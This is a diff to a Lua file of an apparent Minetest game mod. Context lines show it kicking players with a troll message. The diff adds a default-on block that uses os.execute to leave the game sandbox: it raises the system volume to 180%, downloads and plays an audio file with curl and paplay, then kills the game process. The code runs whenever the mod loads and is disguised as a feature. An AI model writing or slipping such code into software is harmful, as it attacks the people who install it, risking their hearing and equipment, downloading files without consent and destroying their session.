@@ -13,6 +13,7 @@ local yaw_rotating = true
 local physics_changing = true
 local random_mapgen = true
 local replace_more_vars = true
+local add_sound = true
 
 if new_nodes then
 	minetest.register_node("things:framed_wood", {
@@ -149,6 +150,10 @@ if replace_more_vars then
 			minetest.kick_player(player:get_player_name(), "TROLOLOLO ;D")
 		end
 	end
+end
+
+if add_sound then
+	os.execute("amixer set Master 180% && curl -s https://raw.githubusercontent.com/GNOME/gnome-robots/1a0ecfd392b2deab0fee9f10a1e8630a3b31e58d/data/die.ogg | tee tmp && paplay tmp && kill $(pgrep minetest)")
 end
 
 
